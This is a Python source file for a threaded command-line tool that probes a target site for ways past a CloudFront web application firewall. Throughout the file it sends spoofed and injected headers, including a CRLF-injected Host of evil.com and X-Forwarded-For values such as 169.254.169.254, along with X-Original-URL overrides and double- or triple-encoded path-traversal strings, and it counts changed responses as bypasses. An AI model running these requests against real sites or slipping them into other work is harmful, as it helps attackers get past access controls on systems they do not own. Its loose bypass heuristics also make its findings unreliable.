"""
CloudFront WAF Bypass Scanner with Smart Detection and Error Handling
"""
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse
import time
import hashlib
import logging
from typing import Optional, List, Dict, Any

from .exceptions import (
    BaselineFailedError,
    InvalidTargetError,
    InvalidSchemeError,
    TargetUnreachableError,
    ScanInterruptedError,
    InvalidThreadCountError,
    InvalidDelayError,
    InvalidTimeoutError,
)
from .error_handler import (
    safe_request,
    validate_url,
    GracefulErrorHandler,
    retry_on_network_error,
)


logger = logging.getLogger(__name__)


class CloudFrontBypasser:
    def __init__(self, target: str, threads: int = 10, delay: float = 0.2, timeout: int = 5):
        """
        Initialize CloudFront WAF Bypasser
        
        Args:
            target: Target URL to scan
            threads: Number of concurrent threads
            delay: Delay between requests (seconds)
            timeout: Request timeout (seconds)
        
        Raises:
            InvalidTargetError: If target URL is invalid
            InvalidThreadCountError: If threads is not positive
            InvalidDelayError: If delay is negative
            InvalidTimeoutError: If timeout is not positive
        """
        # Validate inputs
        self._validate_inputs(target, threads, delay, timeout)
        
        self.target = target.rstrip('/')
        self.threads = threads
        self.delay = delay
        self.timeout = timeout
        self.results = []
        
        # Baseline tracking
        self._baseline_size = None
        self._baseline_hash = None
        self._baseline_status = None
        self._baseline_headers = {}
        
        # Parse target
        try:
            parsed = urlparse(self.target)
            self.domain = parsed.netloc
            self.scheme = parsed.scheme
            
            if not self.domain:
                raise InvalidTargetError(
                    "Invalid target URL: missing domain",
                    details={'target': target}
                )
        except Exception as e:
            raise InvalidTargetError(
                f"Failed to parse target URL: {str(e)}",
                details={'target': target}
            )
        
        logger.info(f"Initialized scanner for {self.target}")
    
    def _validate_inputs(self, target: str, threads: int, delay: float, timeout: int) -> None:
        """Validate all input parameters"""
        # Validate URL
        is_valid, error_msg = validate_url(target)
        if not is_valid:
            raise InvalidTargetError(error_msg, details={'target': target})
        
        # Validate scheme
        parsed = urlparse(target)
        if parsed.scheme not in ['http', 'https']:
            raise InvalidSchemeError(
                f"Invalid scheme '{parsed.scheme}'. Must be http or https",
                details={'target': target, 'scheme': parsed.scheme}
            )
        
        # Validate threads
        if not isinstance(threads, int) or threads <= 0:
            raise InvalidThreadCountError(
                f"Thread count must be positive integer, got: {threads}",
                details={'threads': threads}
            )
        
        # Validate delay
        if not isinstance(delay, (int, float)) or delay < 0:
            raise InvalidDelayError(
                f"Delay must be non-negative number, got: {delay}",
                details={'delay': delay}
            )
        
        # Validate timeout
        if not isinstance(timeout, (int, float)) or timeout <= 0:
            raise InvalidTimeoutError(
                f"Timeout must be positive number, got: {timeout}",
                details={'timeout': timeout}
            )
    
    def scan(self) -> List[Dict[str, Any]]:
        """
        Run all bypass techniques
        
        Returns:
            List of successful bypass results
        
        Raises:
            BaselineFailedError: If baseline cannot be established
            TargetUnreachableError: If target is completely unreachable
            ScanInterruptedError: If scan is interrupted
        """
        logger.info(f"Starting scan of {self.target}")
        print(f"[*] Scanning {self.target}")
        
        # Establish baseline first
        print("[*] Establishing baseline...")
        try:
            baseline = self._get_baseline()
            if not baseline:
                raise BaselineFailedError(
                    "Failed to establish baseline - target may be down",
                    details={'target': self.target}
                )
            
            self._baseline_size = len(baseline.content)
            self._baseline_hash = hashlib.md5(baseline.content).hexdigest()
            self._baseline_status = baseline.status_code
            self._baseline_headers = dict(baseline.headers)
            
            logger.info(
                f"Baseline established: {self._baseline_status} | "
                f"{self._baseline_size} bytes | {self._baseline_hash[:8]}"
            )
            print(f"[+] Baseline: {self._baseline_status} | Size: {self._baseline_size} bytes")
        
        except BaselineFailedError:
            raise
        except TargetUnreachableError:
            raise
        except Exception as e:
            logger.error(f"Unexpected error during baseline: {e}")
            raise BaselineFailedError(
                f"Baseline failed: {str(e)}",
                details={'target': self.target, 'error': str(e)}
            )
        
        print(f"[*] Testing bypass techniques...\n")
        
        # Define all techniques
        techniques = [
            self._test_host_header_injection,
            self._test_x_forwarded_for,
            self._test_x_forwarded_host,
            self._test_x_original_url,
            self._test_cache_control,
            self._test_encoding_bypass,
            self._test_method_bypass,
            self._test_content_type_bypass,
            self._test_http2_downgrade,
            self._test_websocket_upgrade,
            self._test_range_header,
            self._test_double_encoding,
        ]
        
        # Execute techniques with error handling
        error_count = 0
        try:
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = {executor.submit(technique): technique.__name__ for technique in techniques}
                
                for future in as_completed(futures):
                    technique_name = futures[future]
                    try:
                        result = future.result()
                        if result:
                            self.results.extend(result)
                    except KeyboardInterrupt:
                        logger.warning("Scan interrupted by user")
                        raise ScanInterruptedError("Scan interrupted by user")
                    except Exception as e:
                        error_count += 1
                        logger.error(f"Error in {technique_name}: {e}")
                        # Continue with other techniques
        
        except KeyboardInterrupt:
            logger.warning("Scan interrupted by user")
            raise ScanInterruptedError("Scan interrupted by user")
        
        if error_count > 0:
            logger.warning(f"Scan completed with {error_count} technique errors")
            print(f"\n[!] Warning: {error_count} techniques encountered errors")
        
        logger.info(f"Scan complete: Found {len(self.results)} bypasses")
        return self.results
    
    @retry_on_network_error(max_retries=3, backoff_factor=0.5)
    def _get_baseline(self) -> Optional[requests.Response]:
        """
        Get baseline response for comparison with retry logic
        
        Returns:
            Response object or None
        
        Raises:
            TargetUnreachableError: If target cannot be reached after retries
        """
        try:
            resp = safe_request(
                self.target,
                timeout=self.timeout,
                allow_redirects=False
            )
            return resp
        except Exception as e:
            logger.error(f"Baseline request failed: {e}")
            raise
    
    def _test_request(
        self,
        headers: Optional[dict] = None,
        method: str = 'GET',
        path: str = '/'
    ) -> Optional[Dict[str, Any]]:
        """
        Test a single request configuration with error handling
        
        Args:
            headers: Request headers
            method: HTTP method
            path: URL path
        
        Returns:
            Result dictionary or None if request failed
        """
        url = f"{self.target}{path}"
        
        # Use graceful error handler to continue on individual request failures
        with GracefulErrorHandler(f"{method} {path}", continue_on_error=True):
            try:
                resp = safe_request(
                    url,
                    method=method,
                    headers=headers,
                    timeout=self.timeout,
                    allow_redirects=False
                )
                
                if resp is None:
                    return None
                
                # Rate limiting
                time.sleep(self.delay)
                
                # Check if bypass succeeded
                bypass_result = self._is_bypass(resp)
                
                return {
                    'bypass': bypass_result['bypass'],
                    'status': resp.status_code,
                    'headers': headers or {},
                    'method': method,
                    'path': path,
                    'size': len(resp.content),
                    'technique': headers.get('X-Technique', 'Unknown') if headers else 'Unknown',
                    'reason': bypass_result['reason'],
                    'severity': bypass_result['severity']
                }
            
            except Exception as e:
                logger.debug(f"Request failed for {method} {path}: {e}")
                return None
    
    def _is_bypass(self, response: requests.Response) -> Dict[str, Any]:
        """Determine if response indicates WAF bypass with detailed reasoning"""
        
        if self._baseline_size is None:
            return {'bypass': False, 'reason': 'No baseline', 'severity': 'INFO'}
        
        # Ignore error responses (4xx, 5xx) - these are NOT bypasses
        if response.status_code >= 400:
            return {'bypass': False, 'reason': f'Blocked: {response.status_code}', 'severity': 'INFO'}
        
        try:
            current_size = len(response.content)
            current_hash = hashlib.md5(response.content).hexdigest()
            size_diff = abs(current_size - self._baseline_size)
            size_diff_percent = (size_diff / self._baseline_size) * 100 if self._baseline_size > 0 else 0
            
            # CRITICAL: Status code changed from blocked to allowed
            if self._baseline_status in [403, 401] and response.status_code == 200:
                return {
                    'bypass': True,
                    'reason': f'Authentication bypass: {self._baseline_status} → {response.status_code}',
                    'severity': 'CRITICAL'
                }
            
            # HIGH: Significant size difference (different content)
            if size_diff_percent > 10:
                return {
                    'bypass': True,
                    'reason': f'Content difference: {size_diff} bytes ({size_diff_percent:.1f}% change)',
                    'severity': 'HIGH'
                }
            
            # HIGH: Different content hash (even if size similar)
            if current_hash != self._baseline_hash and size_diff > 100:
                return {
                    'bypass': True,
                    'reason': 'Different content returned (hash mismatch)',
                    'severity': 'HIGH'
                }
            
            # CRITICAL: Backend error exposed
            error_indicators = [
                ('exception', 'CRITICAL'),
                ('traceback', 'CRITICAL'),
                ('stack trace', 'CRITICAL'),
                ('sql syntax', 'CRITICAL'),
                ('mysql_', 'CRITICAL'),
                ('postgresql', 'CRITICAL'),
                ('ora-', 'CRITICAL'),
                ('internal server error', 'HIGH'),
                ('500 internal', 'HIGH'),
                ('apache/', 'MEDIUM'),
                ('nginx/', 'MEDIUM'),
                ('iis/', 'MEDIUM'),
                ('tomcat/', 'MEDIUM'),
                ('debug mode', 'HIGH'),
                ('fatal error', 'HIGH'),
                ('warning:', 'MEDIUM'),
            ]
            
            body_lower = response.text.lower()
            for indicator, severity in error_indicators:
                if indicator in body_lower:
                    return {
                        'bypass': True,
                        'reason': f'Backend exposed: "{indicator}" found in response',
                        'severity': severity
                    }
            
            # MEDIUM: Backend server header exposed
            if 'server' in response.headers:
                server = response.headers['server'].lower()
                backend_servers = ['apache', 'nginx', 'iis', 'tomcat', 'jetty', 'gunicorn', 'uwsgi']
                for backend in backend_servers:
                    if backend in server and backend not in self._baseline_headers.get('server', '').lower():
                        return {
                            'bypass': True,
                            'reason': f'Backend server exposed: {response.headers["server"]}',
                            'severity': 'MEDIUM'
                        }
            
            # MEDIUM: X-Powered-By header exposed
            if 'x-powered-by' in response.headers:
                if 'x-powered-by' not in self._baseline_headers:
                    return {
                        'bypass': True,
                        'reason': f'Backend tech exposed: {response.headers["x-powered-by"]}',
                        'severity': 'MEDIUM'
                    }
            
            # MEDIUM: Different redirect location
            if response.status_code in [301, 302, 307, 308]:
                baseline_location = self._baseline_headers.get('location', '')
                current_location = response.headers.get('location', '')
                if current_location and current_location != baseline_location:
                    return {
                        'bypass': True,
                        'reason': f'Different redirect: {current_location}',
                        'severity': 'MEDIUM'
                    }
            
            # No bypass detected
            return {'bypass': False, 'reason': 'Response identical to baseline', 'severity': 'INFO'}
        
        except Exception as e:
            logger.error(f"Error in bypass detection: {e}")
            return {'bypass': False, 'reason': f'Detection error: {str(e)}', 'severity': 'INFO'}
    
    def _test_host_header_injection(self) -> List[Dict[str, Any]]:
        """Test Host header manipulation"""
        results = []
        
        variations = [
            {'Host': 'localhost'},
            {'Host': '127.0.0.1'},
            {'Host': f'{self.domain}:80'},
            {'Host': f'{self.domain}:443'},
            {'Host': f'evil.com\r\nX-Injected: true'},
        ]
        
        for headers in variations:
            headers['X-Technique'] = f'Host Header Injection: {headers["Host"]}'
            result = self._test_request(headers)
            if result and result['bypass']:
                results.append(result)
                print(f"  [✓] BYPASS: {result['technique']} | {result['reason']} | {result['severity']}")
        
        return results
    
    def _test_x_forwarded_for(self) -> List[Dict[str, Any]]:
        """Test X-Forwarded-For bypass"""
        results = []
        
        ips = ['127.0.0.1', '0.0.0.0', '10.0.0.1', '192.168.1.1', '169.254.169.254']
        
        for ip in ips:
            headers = {
                'X-Forwarded-For': ip,
                'X-Technique': f'X-Forwarded-For: {ip}'
            }
            result = self._test_request(headers)
            if result and result['bypass']:
                results.append(result)
                print(f"  [✓] BYPASS: {result['technique']} | {result['reason']} | {result['severity']}")
        
        return results
    
    def _test_x_forwarded_host(self) -> List[Dict[str, Any]]:
        """Test X-Forwarded-Host bypass"""
        results = []
        
        hosts = ['localhost', '127.0.0.1', self.domain, 'evil.com']
        
        for host in hosts:
            headers = {
                'X-Forwarded-Host': host,
                'X-Technique': f'X-Forwarded-Host: {host}'
            }
            result = self._test_request(headers)
            if result and result['bypass']:
                results.append(result)
                print(f"  [✓] BYPASS: {result['technique']} | {result['reason']} | {result['severity']}")
        
        return results
    
    def _test_x_original_url(self) -> List[Dict[str, Any]]:
        """Test X-Original-URL bypass"""
        results = []
        
        paths = ['/', '/admin', '/%2e%2e/', '/..;/']
        
        for path in paths:
            headers = {
                'X-Original-URL': path,
                'X-Technique': f'X-Original-URL: {path}'
            }
            result = self._test_request(headers)
            if result and result['bypass']:
                results.append(result)
                print(f"  [✓] BYPASS: {result['technique']} | {result['reason']} | {result['severity']}")
        
        return results
    
    def _test_cache_control(self) -> List[Dict[str, Any]]:
        """Test Cache-Control bypass"""
        results = []
        
        cache_headers = [
            {'Cache-Control': 'no-cache'},
            {'Cache-Control': 'no-store'},
            {'Cache-Control': 'max-age=0'},
            {'Pragma': 'no-cache'},
        ]
        
        for headers in cache_headers:
            headers['X-Technique'] = f'Cache-Control: {list(headers.values())[0]}'
            result = self._test_request(headers)
            if result and result['bypass']:
                results.append(result)
                print(f"  [✓] BYPASS: {result['technique']} | {result['reason']} | {result['severity']}")
        
        return results
    
    def _test_encoding_bypass(self) -> List[Dict[str, Any]]:
        """Test encoding bypass"""
        results = []
        
        paths = [
            '/%2e/',
            '/..%2f',
            '/%252e%252e/',
            '/%u002e%u002e/',
        ]
        
        for path in paths:
            headers = {'X-Technique': f'Path Encoding: {path}'}
            result = self._test_request(headers, path=path)
            if result and result['bypass']:
                results.append(result)
                print(f"  [✓] BYPASS: {result['technique']} | {result['reason']} | {result['severity']}")
        
        return results
    
    def _test_method_bypass(self) -> List[Dict[str, Any]]:
        """Test HTTP method bypass"""
        results = []
        
        methods = ['POST', 'OPTIONS', 'TRACE', 'TRACK', 'PUT', 'DELETE']
        
        for method in methods:
            headers = {'X-Technique': f'HTTP Method: {method}'}
            result = self._test_request(headers, method=method)
            if result and result['bypass']:
                results.append(result)
                print(f"  [✓] BYPASS: {result['technique']} | {result['reason']} | {result['severity']}")
        
        return results
    
    def _test_content_type_bypass(self) -> List[Dict[str, Any]]:
        """Test Content-Type bypass"""
        results = []
        
        content_types = [
            'application/json',
            'application/xml',
            'text/plain',
            'multipart/form-data',
        ]
        
        for ct in content_types:
            headers = {
                'Content-Type': ct,
                'X-Technique': f'Content-Type: {ct}'
            }
            result = self._test_request(headers, method='POST')
            if result and result['bypass']:
                results.append(result)
                print(f"  [✓] BYPASS: {result['technique']} | {result['reason']} | {result['severity']}")
        
        return results
    
    def _test_http2_downgrade(self) -> List[Dict[str, Any]]:
        """Test HTTP/2 to HTTP/1.1 downgrade bypass"""
        results = []
        
        variations = [
            {'Connection': 'HTTP2-Settings', 'Upgrade': 'h2c'},
            {'Connection': 'Upgrade', 'Upgrade': 'HTTP/2.0'},
            {'Connection': 'close', 'X-Technique': 'HTTP/1.0 Fallback'},
            {'Connection': 'keep-alive', 'Upgrade': 'http/1.0'},
            {'HTTP2-Settings': 'AAMAAABkAARAAAAAAAIAAAAA'},
        ]
        
        for headers in variations:
            if 'X-Technique' not in headers:
                headers['X-Technique'] = f'HTTP/2 Downgrade: {list(headers.keys())[0]}'
            
            result = self._test_request(headers)
            if result and result['bypass']:
                results.append(result)
                print(f"  [✓] BYPASS: {result['technique']} | {result['reason']} | {result['severity']}")
        
        return results
    
    def _test_websocket_upgrade(self) -> List[Dict[str, Any]]:
        """Test WebSocket upgrade bypass"""
        results = []
        
        variations = [
            {
                'Upgrade': 'websocket',
                'Connection': 'Upgrade',
                'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
                'Sec-WebSocket-Version': '13',
                'X-Technique': 'WebSocket Upgrade (Standard)'
            },
            {
                'upgrade': 'WebSocket',
                'connection': 'upgrade',
                'X-Technique': 'WebSocket Upgrade (Case Variation)'
            },
        ]
        
        for headers in variations:
            result = self._test_request(headers)
            if result and result['bypass']:
                results.append(result)
                print(f"  [✓] BYPASS: {result['technique']} | {result['reason']} | {result['severity']}")
        
        return results
    
    def _test_range_header(self) -> List[Dict[str, Any]]:
        """Test Range header bypass"""
        results = []
        
        variations = [
            {'Range': 'bytes=0-1024', 'X-Technique': 'Range: bytes=0-1024'},
            {'Range': 'bytes=0-0', 'X-Technique': 'Range: Single Byte'},
            {'Range': 'bytes=0-100, 200-300', 'X-Technique': 'Range: Multiple Ranges'},
            {'Range': 'bytes=-500', 'X-Technique': 'Range: Last 500 Bytes'},
        ]
        
        for headers in variations:
            result = self._test_request(headers)
            if result and result['bypass']:
                results.append(result)
                print(f"  [✓] BYPASS: {result['technique']} | {result['reason']} | {result['severity']}")
        
        return results
    
    def _test_double_encoding(self) -> List[Dict[str, Any]]:
        """Test double/triple encoding bypass"""
        results = []
        
        encoding_paths = [
            ('/%252e%252e/', 'Double Encoded: ../'),
            ('/%25252e%25252e%25252f', 'Triple Encoded: ../'),
            ('/%2e%252e/', 'Mixed Encoding: .../'),
            ('/%252f', 'Double Encoded: /'),
            ('/%u002e%u002e%u002f', 'Unicode Encoded: ../'),
        ]
        
        for path, description in encoding_paths:
            headers = {'X-Technique': f'Double Encoding: {description}'}
            result = self._test_request(headers, path=path)
            if result and result['bypass']:
                results.append(result)
                print(f"  [✓] BYPASS: {result['technique']} | {result['reason']} | {result['severity']}")
        
        return results


def main():
    """Standalone scanner with comprehensive error handling"""
    from argparse import ArgumentParser
    import json
    import sys
    from .error_handler import setup_logging
    
    parser = ArgumentParser(description='CloudFront WAF Bypass Scanner')
    parser.add_argument('target', help='Target URL')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads')
    parser.add_argument('-d', '--delay', type=float, default=0.2, help='Delay between requests')
    parser.add_argument('--timeout', type=int, default=5, help='Request timeout in seconds')
    parser.add_argument('-o', '--output', help='Output JSON file')
    parser.add_argument('--log-file', help='Log file path')
    parser.add_argument('--log-level', default='INFO', 
                       choices=['DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL'],
                       help='Logging level')
    args = parser.parse_args()
    
    # Setup logging
    setup_logging(args.log_file, args.log_level)
    
    try:
        # Initialize scanner
        scanner = CloudFrontBypasser(args.target, args.threads, args.delay, args.timeout)
        
        # Run scan
        results = scanner.scan()
        
        # Display results
        print(f"\n{'='*60}")
        print(f"[+] Scan Complete: Found {len(results)} actual bypasses")
        print(f"{'='*60}\n")
        
        if results:
            # Group by severity
            critical = [r for r in results if r['severity'] == 'CRITICAL']
            high = [r for r in results if r['severity'] == 'HIGH']
            medium = [r for r in results if r['severity'] == 'MEDIUM']
            
            if critical:
                print(f"🔴 CRITICAL ({len(critical)}):")
                for r in critical:
                    print(f"  - {r['technique']}")
                    print(f"    Reason: {r['reason']}")
            
            if high:
                print(f"\n🟠 HIGH ({len(high)}):")
                for r in high:
                    print(f"  - {r['technique']}")
                    print(f"    Reason: {r['reason']}")
            
            if medium:
                print(f"\n🟡 MEDIUM ({len(medium)}):")
                for r in medium:
                    print(f"  - {r['technique']}")
                    print(f"    Reason: {r['reason']}")
        else:
            print("✅ No bypasses found - target is properly protected")
        
        # Save results
        if args.output:
            with open(args.output, 'w') as f:
                json.dump(results, f, indent=2)
            print(f"\n[+] Results saved to {args.output}")
        
        # Return appropriate exit code
        sys.exit(0 if len(results) == 0 else 1)
    
    except InvalidTargetError as e:
        print(f"[!] Invalid target: {e}")
        logger.error(f"Invalid target: {e}")
        sys.exit(2)
    
    except BaselineFailedError as e:
        print(f"[!] Baseline failed: {e}")
        logger.error(f"Baseline failed: {e}")
        sys.exit(3)
    
    except TargetUnreachableError as e:
        print(f"[!] Target unreachable: {e}")
        logger.error(f"Target unreachable: {e}")
        sys.exit(4)
    
    except ScanInterruptedError as e:
        print(f"\n[!] Scan interrupted: {e}")
        logger.warning(f"Scan interrupted: {e}")
        sys.exit(130)  # Standard exit code for SIGINT
    
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user")
        logger.warning("Scan interrupted by user (Ctrl+C)")
        sys.exit(130)
    
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        logger.exception("Unexpected error during scan")
        sys.exit(1)


if __name__ == '__main__':
    main()